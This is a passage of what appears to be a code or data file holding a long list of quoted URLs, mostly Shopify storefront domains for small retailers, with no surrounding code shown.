    'https://24hundred.com',
    'https://sprinklersupplystore.myshopify.com',
    'https://ember-ca.myshopify.com',
    'https://siennasauceco.com',
    'https://drummagazinestore.myshopify.com',
    'https://altai-dog-food.myshopify.com',
    'https://ann-silvers-ma.myshopify.com',
    'https://poppyspatina.com',
    'https://simplygro.myshopify.com',
    'https://theramerch.myshopify.com',
    'https://zeromarkupebikes.myshopify.com',
    'https://chassis-for-men.myshopify.com',
    'https://6tdr9j-92.myshopify.com',
    'https://atlasmodelrailroad.myshopify.com',
    'https://bodybyjcart.myshopify.com',
    'https://gearone-manufacturing.myshopify.com',
    'https://dsmihealth.myshopify.com',
    'https://armeno-coffee-roasters-ltd.myshopify.com',
    'https://02hken-gh.myshopify.com',
    'https://forwardfruitdesign.com',
    'https://nimbuswellness.myshopify.com',
    'https://hyer-goods.myshopify.com',
    'https://patrickkun.com',
    'https://k-house-store.myshopify.com',
    'https://caufields-novelties.myshopify.com',
    'https://eratimepieces.myshopify.com',
    'https://ij7je1-fn.myshopify.com',
    'https://earths-beauty.myshopify.com',
    'https://shopskinny.myshopify.com',
    'https://oma-the-label.myshopify.com',
    'https://glide-sup.myshopify.com',
    'https://kellylatimoreicons.com',
    'https://ravizupa.myshopify.com',
    'https://janis-ian.myshopify.com',
    'https://healhealthpro.myshopify.com',
    'https://ecolunchboxes.myshopify.com',
    'https://oldeschoolcraft.com',
    'https://shop99convenient.myshopify.com',
    'https://alpine-luddites.myshopify.com',
    'https://glowright.myshopify.com',
    'https://gandhi-foods-inc.myshopify.com',
    'https://signalmart.net',
    'https://sierra-watch.myshopify.com',
    'https://curated-kitchenware.myshopify.com',
    'https://lunaraeproduction.myshopify.com',
    'https://thisisdiamante.myshopify.com',
    'https://dovitamins.myshopify.com',
    'https://800-pound-gorilla.myshopify.com',
    'https://leahday.com',
    'https://teslong1.myshopify.com',
    'https://voterorg.myshopify.com',
    'https://e39650.myshopify.com',
    'https://pacoscoffee.com',
    'https://mission-22.myshopify.com',
    'https://cobram-estate-usa.myshopify.com',
    'https://brooklynfare.myshopify.com',
    'https://kccattleco.myshopify.com',
    'https://jerrasgarden.myshopify.com',
    'https://new-hill-farms.myshopify.com',
    'https://glassacademy.com',
    'https://sunny-sewing-machines.myshopify.com',
    'https://milkyplant.myshopify.com',
    'https://frenchkisstextures.myshopify.com',
    'https://7b15fc-12.myshopify.com',
    'https://stonewalluk.myshopify.com',
    'https://baby-buddha.myshopify.com',
    'https://exotic-snack-guys.myshopify.com',
    'https://biscotteyarns.com',
    'https://ilovethedoux.myshopify.com',
    'https://spi-belt.myshopify.com',
    'https://go-az-promo.myshopify.com',
    'https://mafiabagsv2.myshopify.com',
    'https://simplybargainsshop.myshopify.com',
    'https://blueteesgolf.myshopify.com',
    'https://hunterbay.myshopify.com',
    'https://duckworthadmin.myshopify.com',
    'https://goertzenpottery.com',
    'https://redwood-seeds.myshopify.com',
    'https://tribaltextiles.myshopify.com',
    'https://tefors.myshopify.com',
    'https://ptahcron.com',
    'https://brianritterdesign.com',
    'https://barbarakarnesbooks.myshopify.com',
    'https://crib-sheet.myshopify.com',
    'https://bigtree3d.myshopify.com',
    'https://sparr.myshopify.com',
    'https://schaesplace.com',
    'https://snconstruct.myshopify.com',
    'https://victorysportdesign.com',
    'https://macygrayshop.myshopify.com',
    'https://fowers-games.myshopify.com',
    'https://kiddingaroundyoga-com-shop.myshopify.com',
    'https://kbeautybyniko.myshopify.com',
    'https://emilieheathe.myshopify.com',
    'https://chrisevert.myshopify.com',
    'https://bellhoney.myshopify.com',
    'https://geospaceplay.myshopify.com',
    'https://casey-powell-music.myshopify.com',
    'https://swingpanels.myshopify.com',
    'https://checkeredfloor-com.myshopify.com',
    'https://crazy-monkey-baking.myshopify.com',
    'https://ashandstoneskin.myshopify.com',
    'https://craftythrivin.com',
    'https://luckyline.myshopify.com',
    'https://oddbirdgifts.com',
    'https://gsf-love.myshopify.com',
    'https://grafvonfabercastellusa.myshopify.com',
    'https://thac-store.myshopify.com',
    'https://buycutepix.com',
    'https://lime-line-paint-supply.myshopify.com',
    'https://tonyascookies.myshopify.com',
    'https://staton.myshopify.com',
    'https://kilnparts-com.myshopify.com',
    'https://rosysoil.com',
    'https://themeprintparty.myshopify.com',
    'https://songsforsaplings.myshopify.com',
    'https://seejesus.net',
    'https://jsw-body-jewelry.myshopify.com',
    'https://hold-fast-pro.myshopify.com',
    'https://jadeyoga.myshopify.com',
    'https://greenwoodstore.myshopify.com',
    'https://on3pskis.myshopify.com',
    'https://northgalighting.myshopify.com',
    'https://wwii-impressions-inc.myshopify.com',
    'https://fabshop-news.myshopify.com',
    'https://honest-ppe-supply.myshopify.com',
    'https://1lss-store.myshopify.com',
    'https://pettreats-3481.myshopify.com',
    'https://florawestdesign.com',
    'https://hellomodernecom.myshopify.com',
    'https://lovely-hello.myshopify.com',
    'https://tcbcreative.com',
    'https://uproot-lint-pro.myshopify.com',
    'https://wrinklesschhminkles-usa.myshopify.com',
    'https://happy-kawaii-supplies.myshopify.com',
    'https://scoopwholefoods-tasmania.myshopify.com',
    'https://onehornmonster.myshopify.com',
    'https://homemadeforpetsuk.myshopify.com',
    'https://moonlight-inds.myshopify.com',
    'https://113a8f-4f.myshopify.com',
    'https://pelsbarnworldwide.myshopify.com',
    'https://ninjapoddd.myshopify.com',
    'https://forgetmenotpatterns.com',
    'https://dazzled-distributors.myshopify.com',
    'https://in-the-daylight.myshopify.com',
    'https://mettalusso.myshopify.com',
    'https://glowbeautystore.myshopify.com',
    'https://css-saints-shop.myshopify.com',
    'https://greensupply.com',
    'https://vimmia.myshopify.com',
    'https://arccos-golf-uk.myshopify.com',
    'https://yesenia-lux-lashes.myshopify.com',
    'https://new-save-this-life.myshopify.com',
    'https://1ab4ab.myshopify.com',
    'https://chickenmafia.org',
    'https://michael-hyatt-company.myshopify.com',
    'https://stephaniecorfee.myshopify.com',
    'https://kitteryavecustoms.myshopify.com',
    'https://archerandolive.com',
    'https://ib-active.myshopify.com',
    'https://averagesucks.myshopify.com',
    'https://zlazr.myshopify.com',
    'https://evelynsoriginal.com',
    'https://schwartzvonhalen-com.myshopify.com',
    'https://simbye.com',
    'https://sickpuppies.com',
    'https://glowtokshop.myshopify.com',
    'https://kidswise.myshopify.com',
    'https://smilingdogcoffee.myshopify.com',
    'https://joyspring.myshopify.com',
    'https://paria-outdoor-products.myshopify.com',
    'https://samsplayhouse.myshopify.com',
    'https://animalsasleaders.org',
    'https://cherry-collectables.myshopify.com',
    'https://south-city.myshopify.com',
    'https://ctrlpaint.myshopify.com',
    'https://cookiesbysteph.myshopify.com',
    'https://boss-personal-planner.myshopify.com',
    'https://everymanjack.myshopify.com',
    'https://us-rubber.com',
    'https://fringesports.myshopify.com',
    'https://lostworldmuseum.myshopify.com',
    'https://brodandtaylor.com',
    'https://lenten-embassy.myshopify.com',
    'https://survival-gear-and-products.myshopify.com',
    'https://icartistic.myshopify.com',
    'https://fantagraphics.myshopify.com',
    'https://insectlore.myshopify.com',
    'https://bauer-media-group.myshopify.com',
    'https://estesrockets.myshopify.com',
    'https://leader-dogs-for-the-blind-gift-shop.myshopify.com',
    'https://kobeesco.com',
    'https://lashess-by-les.myshopify.com',
    'https://love-thinks.myshopify.com',
    'https://just-thrive-probiotic-store.myshopify.com',
    'https://l-and-j-designs-21.myshopify.com',
    'https://glwgrlbt.myshopify.com',
    'https://ysolda.com',
    'https://college-classes-2.myshopify.com',
    'https://neat-method.myshopify.com',
    'https://jillstreasurechest.myshopify.com',
    'https://ebestsale.myshopify.com',
    'https://3duxdesign.myshopify.com',
    'https://instapark-inc.myshopify.com',
    'https://good-buy-supply.myshopify.com',
    'https://big-gay-media.myshopify.com',
    'https://trycloudy.com',
    'https://glass-growers-gallery-inc.myshopify.com',
    'https://gkitaly.myshopify.com',
    'https://george-ronald-publisher.myshopify.com',
    'https://apologeticspress.myshopify.com',
    'https://lumekeebs.com',
    'https://mummyoffour.myshopify.com',
    'https://fragrancebuddy2.myshopify.com',
    'https://canecreekdtc.myshopify.com',
    'https://st-johns-riverkeeper.myshopify.com',
    'https://cabotscandy.com',
    'https://ancutiecreations.com',
    'https://studiobrootle.myshopify.com',
    'https://joshuacreekbooks.myshopify.com',
    'https://shopnewsol.com',
    'https://shop.glowforge.com',
    'https://basis-pet-llc.myshopify.com',
    'https://marvac.myshopify.com',
    'https://clever-metro.myshopify.com',
    'https://koasmarketplace.myshopify.com',
    'https://holy-naturals-2950.myshopify.com',
    'https://chomps.myshopify.com',
    'https://dormeo-na.myshopify.com',
    'https://feelsapparel.com',
    'https://ccae01-6.myshopify.com',
    'https://beastro.myshopify.com',
    'https://mouses-chocolates.myshopify.com',
    'https://truewerk.myshopify.com',
    'https://earth-shift-products.myshopify.com',
    'https://10minuteworkshop.myshopify.com',
    'https://ipibooks.com',
    'https://cupcakejemma.com',
    'https://augustnoa.com',
    'https://bamboo-bamboo.myshopify.com',
    'https://txbx.myshopify.com',
    'https://sanshee-usa.myshopify.com',
    'https://big-sissy-gear.myshopify.com',
    'https://divine-mercy-shrine-gift-shop.myshopify.com',
    'https://megamarting.myshopify.com',
    'https://happyplangirlsdesigns.myshopify.com',
    'https://theadventurechallenge.myshopify.com',
    'https://insartify.com',
    'https://0be8cb-53.myshopify.com',
    'https://farmgirldesigns.myshopify.com',
    'https://shoprite-affordable-shopping.myshopify.com',
    'https://onetwentyninecxxix.myshopify.com',
    'https://bazicstore.myshopify.com',
    'https://ogxsoftball.myshopify.com',
    'https://first-in-architecture.myshopify.com',
    'https://cvlinens.myshopify.com',
    'https://zannabeauty.myshopify.com',
    'https://lakes-rivers-streams.myshopify.com',
    'https://lifeboostcoffee.myshopify.com',
    'https://homeandkind.com',
    'https://devtslstore.myshopify.com',
    'https://spine-9499.myshopify.com',
    'https://cozys-scrapbooking.myshopify.com',
    'https://alchemy-merch.myshopify.com',
    'https://fitzroy-readers.myshopify.com',
    'https://exploring-the-simulation.myshopify.com',
    'https://firefly-nature-schooling.myshopify.com',
    'https://lady-dan-authentic-vietnamese-cuisine.myshopify.com',
    'https://hta-atlanta.myshopify.com',
    'https://circle-21-candles.myshopify.com',
    'https://gunfighteruniversity.myshopify.com',
    'https://decmakeup.myshopify.com',
    'https://themakerbeancafe.myshopify.com',
    'https://hookandirons.myshopify.com',
    'https://virtualbookworm.myshopify.com',
    'https://kozi-pie-shoppe.myshopify.com',
    'https://dimplecolor.com',
    'https://junior-virginia-beach-garden-club-2.myshopify.com',
    'https://kidznote.myshopify.com',
    'https://i1tb1x-dr.myshopify.com',
    'https://la-cocina-sf-store.myshopify.com',
    'https://nematperfumes.myshopify.com',
    'https://elizabethhunterbooks.myshopify.com',
    'https://teamiblends-us.myshopify.com',
    'https://dada-nz.myshopify.com',
    'https://cd2587-f2.myshopify.com',
    'https://juukdesign.com',
    'https://idewcare.com',
    'https://opopopshop.myshopify.com',
    'https://mill-coffee-tea.myshopify.com',
    'https://atmosfx.myshopify.com',
    'https://integrity-research-institute.myshopify.com',
    'https://centergroveorchard.myshopify.com',
    'https://pri-gift-shop.myshopify.com',
    'https://holstery.myshopify.com',
    'https://1ds4cg-mw.myshopify.com',
    'https://kokochondria.myshopify.com',
    'https://intrism.myshopify.com',
    'https://homecourt-co.myshopify.com',
    'https://abathhouse.myshopify.com',
    'https://homeschoolingtoday.com',
    'https://gariz.myshopify.com',
    'https://crossovermeats.myshopify.com',
    'https://ebd99c.myshopify.com',
    'https://saguaroshoesus.myshopify.com',
    'https://calliesbiscuits.com',
    'https://thebiblerecap.myshopify.com',
    'https://teresarubiolo.myshopify.com',
    'https://diversion-private-label-books.myshopify.com',
    'https://the-protein-bakery.myshopify.com',
    'https://rebrandskincare.com',
    'https://lk-top-coats.myshopify.com',
    'https://fill-it-forward.myshopify.com',
    'https://anzula.myshopify.com',
    'https://fancythatprescott.com',
    'https://forrestfrank.myshopify.com',
    'https://filmneverdie-com.myshopify.com',
    'https://ivy-and-betty.myshopify.com',
    'https://penciltree.com.au',
    'https://thefoundrycollective.myshopify.com',
    'https://kindfunerals.myshopify.com',
    'https://rcjwui-c2.myshopify.com',
    'https://festive-creations-by-stephanie.myshopify.com',
    'https://footnanny-2.myshopify.com',
    'https://coveryourgray.com',
    'https://coconu.com',
    'https://gnrhs.myshopify.com',
    'https://cuveecoffee.myshopify.com',
    'https://keyenigma.com',
    'https://18bhyc-zn.myshopify.com',
    'https://this-element-inc.myshopify.com',
    'https://flippin-fabulous-llc.myshopify.com',
    'https://caliberandcompanywholesale-com.myshopify.com',
    'https://wildcatcorner.myshopify.com',
    'https://purecosmetics.com',
    'https://unearthed-goods-co.myshopify.com',
    'https://healing-touch-program-official-store.myshopify.com',
    'https://celebrationwarehouse.myshopify.com',
    'https://coslus.myshopify.com',
    'https://sarahschocolatekitchen.com',
    'https://noelicreates.com',
    'https://babymetal-official.myshopify.com',
    'https://iron-bean-coffee-company.myshopify.com',
    'https://planetpeterson.myshopify.com',
    'https://darlingmamadigitals.myshopify.com',
    'https://testforplayhooray.myshopify.com',
    'https://ambi-skincare.myshopify.com',
    'https://e96bb0-58.myshopify.com',
    'https://brunekitchen.com',
    'https://customplenumcreations.myshopify.com',
    'https://ejtrendss.myshopify.com',
    'https://tattoo-heritage-project.myshopify.com',
    'https://kan-kitchen.myshopify.com',
    'https://righteousbabe.myshopify.com',
    'https://thelittle1s.myshopify.com',
    'https://chazdeanstudio.myshopify.com',
    'https://geekria.myshopify.com',
    'https://mhs-warriors-warehouse.myshopify.com',
    'https://russos-produce.myshopify.com',
    'https://kingdomdeath.myshopify.com',
    'https://vograce.myshopify.com',
    'https://madewithhappy.myshopify.com',
    'https://villagebakery1948.myshopify.com',
    'https://baby-box-llcc.myshopify.com',
    'https://goruck-demo.myshopify.com',
    'https://freedomfiler.myshopify.com',
    'https://local-eclectic-usa.myshopify.com',
    'https://k-kscollection.myshopify.com',
    'https://panthercoffee.myshopify.com',
    'https://prntx-2.myshopify.com',
    'https://classicalacademicpress.myshopify.com',
    'https://tazachocolate.com',
    'https://sofontsy.myshopify.com',
    'https://clementinescreamery.com',
    'https://alishascupcakes.myshopify.com',
    'https://8ce28b.myshopify.com',
    'https://ashuriart.myshopify.com',
    'https://denisegaskins.myshopify.com',
    'https://westernweartexas.com',
    'https://garholerecords.com',
    'https://workeasyapp.myshopify.com',
    'https://happysunflowerworks.myshopify.com',
    'https://theopresents.myshopify.com',
    'https://torchwarriorwear.com',
    'https://hepzi-tex-styles.myshopify.com',
    'https://meowtel-store.myshopify.com',
    'https://craftingmyhome.myshopify.com',
    'https://kodabuilt.myshopify.com',
    'https://rebluk.myshopify.com',
    'https://iceageperformance.myshopify.com',
    'https://westofthethirdwatchcompany.com',
    'https://gonzales-party-store.myshopify.com',
    'https://organisedhq.myshopify.com',
    'https://bestpricedtf.myshopify.com',
    'https://hairstrongband.myshopify.com',
    'https://esandrovale.com',
    'https://jcardiecast.com',
    'https://aramara-beauty.myshopify.com',
    'https://rubiomonocoatusa.myshopify.com',
    'https://overthepartytable.myshopify.com',
    'https://totescan.myshopify.com',
    'https://commercial-real-estate-success-strategies.myshopify.com',
    'https://playingtots.myshopify.com',
    'https://stickyriceco.com',
    'https://engagetest.myshopify.com',
    'https://zyrosupply.myshopify.com',
    'https://gognarly.com',
    'https://leather-satchel-usa.myshopify.com',
    'https://hacksmith.myshopify.com',
    'https://ikegger.myshopify.com',
    'https://wildonepets.myshopify.com',
    'https://annkullberg-com.myshopify.com',
    'https://ascentelevated.myshopify.com',
    'https://lifespanfitness.myshopify.com',
    'https://jennys-print-shop.myshopify.com',
    'https://jasminandjuniper.myshopify.com',
    'https://dan-joyce-art.myshopify.com',
    'https://thequeenbeads.myshopify.com',
    'https://nasalden.myshopify.com',
    'https://lovepittsburghshop.com',
    'https://f2d2a0-2.myshopify.com',
    'https://paulcardall.myshopify.com',
    'https://dy-keeb.myshopify.com',
    'https://seoulceuticals.com',
    'https://xpr-motorsports.myshopify.com',
    'https://doubleoutlines.com',
    'https://woodformvinylcreations.com',
    'https://law-office-of-marilyn-sullivan.myshopify.com',
    'https://birchbenders.myshopify.com',
    'https://eurospaaromatics.myshopify.com',
    'https://onyx-fragrance.myshopify.com',
    'https://marcofanton.myshopify.com',
    'https://fusion-creations-by-kg.myshopify.com',
    'https://bobmack3d.myshopify.com',
    'https://myspicesage.myshopify.com',
    'https://tlcdesignsandcustoms.myshopify.com',
    'https://artbycady.com',
    'https://md-factor.myshopify.com',
    'https://ac2t.myshopify.com',
    'https://bumbleridetest.myshopify.com',
    'https://circular-ring.myshopify.com',
    'https://kinetics-cosmetics.myshopify.com',
    'https://clayrevolution.myshopify.com',
    'https://basicallybritt.com',
    'https://pastelgrid.myshopify.com',
    'https://wildandfreeoutdoor.myshopify.com',
    'https://national-desert-storm-war-memorial.myshopify.com',
    'https://teaembassy.myshopify.com',
    'https://artbykayrae.com',
    'https://8f0bc6.myshopify.com',
    'https://nelson-nursery.myshopify.com',
    'https://purebreadbakery.myshopify.com',
    'https://lifted-labor-co.myshopify.com',
    'https://cosawoveworkwear.myshopify.com',
    'https://legitgrails.com',
    'https://jordanvalleydesigns.com',
    'https://decoupage-napkins-com.myshopify.com',
    'https://mnhs.myshopify.com',
    'https://illustratedmonthly.myshopify.com',
    'https://dollhousealley.com',
    'https://designmehair.myshopify.com',
    'https://intrigue-designs.myshopify.com',
    'https://2d0369-6f.myshopify.com',
    'https://free-the-bears.myshopify.com',
    'https://getbeast.com',
    'https://zeofill.myshopify.com',
    'https://shelfloveco.com',
    'https://ecomgraduates.com',
    'https://mrswordsmithdevelopment.myshopify.com',
    'https://jeorgeproducts.myshopify.com',
    'https://lima-deals.myshopify.com',
    'https://partydepotspringfield.myshopify.com',
    'https://wineandbeersupply.com',
    'https://sinupulse.myshopify.com',
    'https://hunterbay.com',
    'https://thexcj.myshopify.com',
    'https://annika-martin.myshopify.com',
    'https://autolinepro.com',
    'https://happytailswellness.myshopify.com',
    'https://fluidnutrition.myshopify.com',
    'https://lordydordie.myshopify.com',
    'https://fizzyoral.myshopify.com',
    'https://itsneonrushdesigns.myshopify.com',
    'https://inchbug.com',
    'https://divineredolence.myshopify.com',
    'https://landoftheblind.myshopify.com',
    'https://lost-and-found-band.myshopify.com',
    'https://wilcostore.com',
    'https://effortless-theme-demo.myshopify.com',
    'https://arkansas-outdoor-power-equipment.myshopify.com',
    'https://the-mavericks-merch.myshopify.com',
    'https://menwithmission.com',
    'https://savory-institute.myshopify.com',
    'https://ulefoneofsweden.myshopify.com',
    'https://lionstore-9992.myshopify.com',
    'https://woodhaven.myshopify.com',
    'https://loverpi.myshopify.com',
    'https://ussnjcc.myshopify.com',
    'https://diaperlab.com',
    'https://info-lemonade51o.myshopify.com',
    'https://lyricandstone.myshopify.com',
    'https://christina-loves-planning.myshopify.com',
    'https://louis-ck.myshopify.com',
    'https://theygcollection.myshopify.com',
    'https://lunableucandles.myshopify.com',
    'https://aphogee.com',
    'https://s19designs.myshopify.com',
    'https://sweet-kawaii-designs.myshopify.com',
    'https://magnetpro-2.myshopify.com',
    'https://kevinlovegreen.com',
    'https://magazinecafe01.myshopify.com',
    'https://germblocker.myshopify.com',
    'https://tanglenpto.myshopify.com',
    'https://b96735-f7.myshopify.com',
    'https://treatbeauty.myshopify.com',
    'https://thesticker-shop.com',
    'https://balletassociation.myshopify.com',
    'https://gupshupgreetings.com',
    'https://truly-inspired-paper-co.myshopify.com',
    'https://fisher-brewing-company.myshopify.com',
    'https://dsgouterwear.myshopify.com',
    'https://thes3xtalk.myshopify.com',
    'https://the-weekendquilter.com',
    'https://slaynsteelco.com',
    'https://goodnightfox.myshopify.com',
    'https://planning-with-kay.myshopify.com',
    'https://brys-kraftroom.myshopify.com',
    'https://cbb271-5e.myshopify.com',
    'https://thebeeswaxyknees.com',
    'https://chloesgiantcookies.com',
    'https://ys-knots.myshopify.com',
    'https://4conly.myshopify.com',
    'https://iceucentral.myshopify.com',
    'https://daycards.myshopify.com',
    'https://oclean-official.myshopify.com',
    'https://mcreativej.myshopify.com',
    'https://vctusa.myshopify.com',
    'https://hozodesign.com',
    'https://martha-white.myshopify.com',
    'https://azoproducts.myshopify.com',
    'https://liquidationfashion.myshopify.com',
    'https://westernstonestudios.com',
    'https://kjpottery.myshopify.com',
    'https://62bf1c-2.myshopify.com',
    'https://cpc-online-uk.myshopify.com',
    'https://dollarhobbyz.myshopify.com',
    'https://kluk-custom-calls.myshopify.com',
    'https://k9medicinals-com.myshopify.com',
    'https://hyve-beauty.myshopify.com',
    'https://anthrosfoundation.myshopify.com',
    'https://d-gray-drafting-and-design.myshopify.com',
    'https://caroline-shaw-editions.myshopify.com',
    'https://freeperiodpress.myshopify.com',
    'https://evanhill.myshopify.com',
    'https://diamandagalas.myshopify.com',
    'https://pastelgrid.com',
    'https://curlsmith.myshopify.com',
    'https://shinespeechactivities.com',
    'https://roysrockets.com',
    'https://rvlifestyle.myshopify.com',
    'https://ictbuildingsolutions.myshopify.com',
    'https://a7ebaa.myshopify.com',
    'https://gnomeroad.myshopify.com',
    'https://bc77f2-2.myshopify.com',
    'https://aquateko.myshopify.com',
    'https://emmagates.myshopify.com',
    'https://ambrosia-long-life-linen.myshopify.com',
    'https://mbferts-bulk-wholesale-hydroponic-equipment-dealer.myshopify.com',
    'https://kouzikrafts.myshopify.com',
    'https://itsmylunchbox.myshopify.com',
    'https://snapframes4sale.myshopify.com',
    'https://custom-pilot-shirts.myshopify.com',
    'https://justthrivehealth.com',
    'https://pawbookstore.com',
    'https://teamsters2010.myshopify.com',
    'https://agelessderma-com.myshopify.com',
    'https://comfypackage.myshopify.com',
    'https://lunaralivingdecor.com',
    'https://wmg-nessa-barrett.myshopify.com',
    'https://super-tots.com',
    'https://littleranchfamily.myshopify.com',
    'https://vixmerch-official.myshopify.com',
    'https://laulomleather.com',
    'https://amishtoybox.com',
    'https://ladyfingersletterpress.myshopify.com',
    'https://temp2016.myshopify.com',
    'https://gabriel-simone.myshopify.com',
    'https://mghgeneralstore.myshopify.com',
    'https://higher-grounds-coffee.myshopify.com',
    'https://saiganeshupahar.myshopify.com',
    'https://botanica-ifalolaye.myshopify.com',
    'https://jp-co-8584.myshopify.com',
    'https://dr-dino.myshopify.com',
    'https://scotteveststore.myshopify.com',
    'https://phenixfirehelmets.myshopify.com',
    'https://jennifermaker.myshopify.com',
    'https://refit.myshopify.com',
    'https://malojos.myshopify.com',
    'https://keoker.net',
    'https://hormex.myshopify.com',
    'https://symbaproducts.com',
    'https://blueblockers.myshopify.com',
    'https://lucky-teeth.myshopify.com',
    'https://1d9b48-76.myshopify.com',
    'https://sweetpeacollective.com',
    'https://a5bc93-48.myshopify.com',
    'https://nakerybeauty.com',
    'https://hw6xq9-wy.myshopify.com',
    'https://lucky-pet-2.myshopify.com',
    'https://lostkat.com',
    'https://1d96cb-95.myshopify.com',
    'https://eyebrow-queen-pro.myshopify.com',
    'https://growganicainc.myshopify.com',
    'https://withsimplicitybeauty.com',
    'https://point-university-campus-store.myshopify.com',
    'https://neptonics.myshopify.com',
    'https://eptest199.myshopify.com',
    'https://shiftathleisurewear.com',
    'https://money-minded-mom-shop.myshopify.com',
    'https://color-cord-dev.myshopify.com',
    'https://ilovesab.myshopify.com',
    'https://alpatronix.myshopify.com',
    'https://parademade.com',
    'https://bows-and-arrows-co-llc.myshopify.com',
    'https://curlsmith.com',
    'https://rubyhammer.com',
    'https://glam-housefabrics.myshopify.com',
    'https://thats-what-che-said.myshopify.com',
    'https://a9f42d-2.myshopify.com',
    'https://brakefreetech.myshopify.com',
    'https://convert-a-bench.myshopify.com',
    'https://petsnowy.myshopify.com',
    'https://hanabi-mobile.myshopify.com',
    'https://menswallet.myshopify.com',
    'https://k4h0sb-gu.myshopify.com',
    'https://schildincofficial.myshopify.com',
    'https://buniyaa-com.myshopify.com',
    'https://hplhs-store.myshopify.com',
    'https://lull.com',
    'https://burleyfisherbooks.com',
    'https://walleye-nation-creations.myshopify.com',
    'https://freesatie.myshopify.com',
    'https://fbac-store.myshopify.com',
    'https://therefugeecollective.myshopify.com',
    'https://bumbleride.com',
    'https://atlas-throttle-lock.myshopify.com',
    'https://surfgoat.myshopify.com',
    'https://bushmasterblues.myshopify.com',
    'https://vyoletshop.com',
    'https://kindnessranchstore.myshopify.com',
    'https://activplayground.myshopify.com',
    'https://1441-wc-vip.myshopify.com',
    'https://plankroad.com',
    'https://inouf.myshopify.com',
    'https://tacky-jacks.myshopify.com',
    'https://three-main.myshopify.com',
    'https://readkaleidoscope.com',
    'https://sandbaggy.myshopify.com',
    'https://northcoastseafoods.myshopify.com',
    'https://thedailyessentials1.myshopify.com',
    'https://cupboard-distributing.myshopify.com',
    'https://bohemianfinding.myshopify.com',
    'https://happy-simple-mom-shop.myshopify.com',
    'https://gelatomessina.myshopify.com',
    'https://hokulea.myshopify.com',
    'https://babybottlebrushbib.com',
    'https://chopfit.myshopify.com',
    'https://bigen-usa-com.myshopify.com',
    'https://pugliepug.com',
    'https://nothingbutleds-com.myshopify.com',
    'https://paintinglulu.myshopify.com',
    'https://robo-roku.myshopify.com',
    'https://owletcare.myshopify.com',
    'https://leafandlathersoap.myshopify.com',
    'https://mlasheaandcompany.myshopify.com',
    'https://chair-table-tips.myshopify.com',
    'https://wetcloths-com.myshopify.com',
    'https://modernmetalsongwriter.myshopify.com',
    'https://mixtemplates.myshopify.com',
    'https://shop.chakakhan.com',
    'https://coolify.torraslife.com',
    'https://back-on-the-racks-consignment.myshopify.com',
    'https://cottonandjoy.com',
    'https://neiljouproductions.myshopify.com',
    'https://komals-passion-leather.myshopify.com',
    'https://shop.homeandkind.com',
    'https://bluelandhome.myshopify.com',
    'https://lalasassafras.com',
    'https://aloracreates.com',
    'https://schutz.myshopify.com',
    'https://jphmarket.myshopify.com',
    'https://limitless-savvy-touch.myshopify.com',
    'https://eat-prept-meals.myshopify.com',
    'https://peakvision-sunglasses.myshopify.com',
    'https://papaya-reusables.myshopify.com',
    'https://iron-maiden-bier-austria.myshopify.com',
    'https://mom-that-loves-to-clean.myshopify.com',
    'https://catoro.myshopify.com',
    'https://aprilbernphoto.myshopify.com',
    'https://rabbitair.myshopify.com',
    'https://ahava-medspa.myshopify.com',
    'https://acmesmokedfish.com',
    'https://forever-cacao.myshopify.com',
    'https://giftshire.com',
    'https://mt-baker-mountain-shop.myshopify.com',
    'https://olio-skin-beard-co.myshopify.com',
    'https://etoile-collective-us.myshopify.com',
    'https://euromini-zizzo.myshopify.com',
    'https://almaskyn.myshopify.com',
    'https://green-mountain-adventure-middlebury-mountaineer.myshopify.com',
    'https://dubtrio.com',
    'https://color-red-music.myshopify.com',
    'https://4ad7f7.myshopify.com',
    'https://characterpowers.com',
    'https://harpercollins-us.myshopify.com',
    'https://sterling-ink.com',
    'https://flagnorfail.myshopify.com',
    'https://scottrohlfs.com',
    'https://freetheroots.myshopify.com',
    'https://thinkteamhustle.com',
    'https://shoppineridgehollow.com',
    'https://alessia-cara.myshopify.com',
    'https://jessicasjournalshop.myshopify.com',
    'https://h2d-hair-care.myshopify.com',
    'https://crunchy-organics.myshopify.com',
    'https://gofastcampers.myshopify.com',
    'https://acoustic-panels-canada.myshopify.com',
    'https://bambushop.myshopify.com',
    'https://jeannienitroclothing.com',
    'https://lacoaa-org.myshopify.com',
    'https://kamerar.myshopify.com',
    'https://upliftactive.com',
    'https://btr-bar.myshopify.com',
    'https://foodvacbags2.myshopify.com',
    'https://studiododge.com',
    'https://bankspower.myshopify.com',
    'https://132461-96.myshopify.com',
    'https://coachkrytal.myshopify.com',
    'https://beunospa.myshopify.com',
    'https://t4s-vendors.myshopify.com',
    'https://brandnamecontacts.myshopify.com',
    'https://reftoons.myshopify.com',
    'https://centre-for-apologetic-scholarship-education.myshopify.com',
    'https://god-scent-soap.myshopify.com',
    'https://martha-ponn-jewelry-designs.myshopify.com',
    'https://functional-patterns.myshopify.com',
    'https://simplylightdesigns.com',
    'https://minguajerky.myshopify.com',
    'https://drbrownsbaby.myshopify.com',
    'https://jenny-provo.myshopify.com',
    'https://aqua-bound.myshopify.com',
    'https://goodfoodforgood.myshopify.com',
    'https://landmcreations11.myshopify.com',
    'https://mxwholesale-uk.myshopify.com',
    'https://clumpies.com',
    'https://cascadia-coffee.myshopify.com',
    'https://onezopa.myshopify.com',
    'https://fytest.myshopify.com',
    'https://gc2b.myshopify.com',
    'https://embrace-your-style-nails.myshopify.com',
    'https://clearly-filtered.myshopify.com',
    'https://bobbininquilts.com',
    'https://boujee-sisters-on-a-budget.myshopify.com',
    'https://missfits-shop.myshopify.com',
    'https://busy-bebe.myshopify.com',
    'https://loveday-distillery.myshopify.com',
    'https://drumsondemand.myshopify.com',
    'https://bbinfinite.myshopify.com',
    'https://jamstik.myshopify.com',
    'https://westside-barbell.myshopify.com',
    'https://uniquenapkins.myshopify.com',
    'https://powertac.myshopify.com',
    'https://tokyopenshop.com',
    'https://act-acre-uk.myshopify.com',
    'https://theorangepeel-asheville.myshopify.com',
    'https://0f5hvf-dk.myshopify.com',
    'https://kandykorner.myshopify.com',
    'https://daisysgiftshopanddesigns.myshopify.com',
    'https://griptight-tape.myshopify.com',
    'https://owlvenice.myshopify.com',
    'https://diversitystore-com.myshopify.com',
    'https://alma-records.myshopify.com',
    'https://penny-modern-store.myshopify.com',
    'https://patternbeauty.myshopify.com',
    'https://gunnaroptiksllc.myshopify.com',
    'https://7c1704.myshopify.com',
    'https://buffalobrewshop.myshopify.com',
    'https://welovebeading.myshopify.com',
    'https://mrsdsshop.myshopify.com',
    'https://mr-medical.myshopify.com',
    'https://aloha-dev.myshopify.com',
    'https://hardware.shopify.com',
    'https://green-lili.myshopify.com',
